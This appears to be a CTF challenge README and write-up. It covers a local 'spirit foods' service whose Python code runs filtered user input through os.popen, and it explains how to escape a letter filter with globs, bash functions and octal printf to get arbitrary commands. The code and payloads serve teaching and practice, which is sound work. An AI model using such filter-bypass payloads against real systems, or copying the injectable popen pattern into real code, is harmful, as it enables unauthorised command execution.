# Bashing your spirit foods
Testing on bash injection knowledge

<i>Creator - @Platy</i>

## Category
Misc.

## Question
>You are not yourself when you are hungry. Have a CTF challenge and stop <i>bashing</i> people up.
>
>Connect via `nc 127.0.0.1 2500` (Change to desired ip address and port)

## Hint
`I hate needles`

## Setup
Do `bash start.sh`

## Solution
This challenge tests on bash injection.
```
Foods available
[n]achos
[f]ishies
> 
```
If we try to enter any other letters besides `n` or `f`, we will get:
```
Sorry, but we do not serve these here. Maybe next time!
```
When we try to get `n` for nachos, we get this:
```
  _   _            _               
 | \ | |          | |              
 |  \| | __ _  ___| |__   ___  ___ 
 | . ` |/ _` |/ __| '_ \ / _ \/ __|
 | |\  | (_| | (__| | | | (_) \__ \
 |_| \_|\__,_|\___|_| |_|\___/|___/

Hope you enjoy!
sh: 1: n: not found
```
Same goes when we type `f` except we get 'Fishies' instead of 'Nachos'.

We get `sh: 1 n: not found`. It runs a shell with the input as the command. For example, if we entered `cat /etc/passwd`, the output will be printed back. However, we cannot use such a enter that because it contains other letters besides `n` or `f`. When we try `nnnnnn`, it shows `sh: 1: nnnnnn: not found`.

First, we should try using cat to view the contents of all the files. But how can we send cat using only `n` or `f`? It turns out after trying many different characters, it accepts special characters `!@#$%^*()[]{};',.` etc.

```
[n]achos
[f]ishies
> ()
Hope you enjoy!
sh: 1: Syntax error: ")" unexpected
```

So we can use special characters and the letters `n` and `f`. Now we're getting somewhere. Unix has autocompletion functions. Typing out `cat *` well expand to `cat <filename>`. The asterisk represents any number of characters. The question marks represents only one character.

So by inputting `/??n/??? *`, we manage to view all the files on the folder as well as some system files. This reveals the python script and shows what it is actually doing

```python
def getFlag():
	input = raw_input('''Foods available
[n]achos
[f]ishies
> ''')
	if (re.findall('[0-9a-eg-mo-zA-Z]',input) == []):
		if input == 'n':
			nachos()
		elif input == 'f':
			fish()
		print 'Hope you enjoy!'
		print os.popen(input).read()
	else:
		print 'Sorry, but we do not serve these here. Maybe next time!'
```

We can now see that it filters out `[0-9a-eg-mo-zA-Z]`.

By using autocompletition again, we can use `printf` to output the necessary characters to the file.

Locate `printf` by using `/*/??n/???n?f`

Functions can be created in bash `functionName(){ function; }`. By using this method we can create a print function `n(){ /*/??n/???n?f ${@}; };` where `${@}` represents the parameters passed to the print function

We can use octal to print out characters. All we need now is to be able to print numbers without actually printing numbers.

`${#}` counts the number of arguments specified to the print function. Using the previously declared function `n`, we can use it to create a new function `f(){ n ${#}; };`

Now we can specify any number we want and by extension, whatever string we want. This prints out 'a' because the octal for 'a' is '141'. Therefore, there are 3 function `f` with 1, 4 and 1 as arguments respectively:
```bash
n(){ /*/??n/???n?f ${@}; }; f(){ n ${#}; };n $(n \\\\`f "" ; f "" "" "" "" ; f "" ; `;)
```

We can add another `$()` that acts like an 'eval' function which allows us to run whatever command we like. You can run any command with nothing more than 'n', 'f' and a bunch of special characters!

For example, `ls` becomes this:
```bash
n(){ /*/??n/???n?f ${@}; }; f(){ n ${#}; };$(n $(n \\\\`f "" ; f "" "" "" "" "" ; f "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" "" ; f "" "" "" ; `;))
```

There is a generator `solution.py` in the solution folder to generate the commands.

Basically, we have shell access with a very troublesome way to run commands.

We can now use `ls -la` to find if there are any interesting files.

There are 2 files, `flag.txt` and `.v13wF1a6`. We do not have permission to view the `flag.txt`, however, when `.v13wF1a6` runs, the program runs as user 'bashing_pwn' which happens to be the owner of `flag.txt`.

Running the program shows this: `Requires argv[1] as password`. Great! Now we need a password. Using `strings .v13wF1a6` we are able to deduce that the password is `f1ag_iz_n0t_f4r_aw4y_if_y0u_believ3`.

Running the program again with the correct password gives you the flag. Final command is in `solution.txt` in the solution folder.

Phew! That was very lengthy and probably a lot to absorb.

### Flag
Flag: flag{this_is_a_flag} (Change to desired flag)

## Distribution
No files to be distributed

### Credits
33c3 ctf - 2016

Misc.

hohoho - 350pts
